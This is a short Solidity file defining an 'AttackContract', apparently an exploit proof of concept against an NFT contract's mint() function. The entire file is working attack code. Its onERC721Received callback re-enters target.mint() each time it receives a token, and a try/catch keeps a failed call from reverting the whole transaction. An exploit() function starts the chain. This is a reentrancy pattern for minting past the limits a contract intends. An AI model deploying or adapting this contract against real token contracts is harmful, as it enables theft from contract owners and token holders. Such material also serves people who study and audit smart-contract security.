// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface ITokenContract {
    function mint() external payable;
    function totalSupply() external view returns (uint256);
}

contract AttackContract {
    ITokenContract public target;

    constructor(address _target) {
        target = ITokenContract(_target);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        try target.mint() {}
        catch {
            return 0x150b7a02;
        }
        return 0x150b7a02;
    }

    function exploit() external {
        target.mint();
    }
}
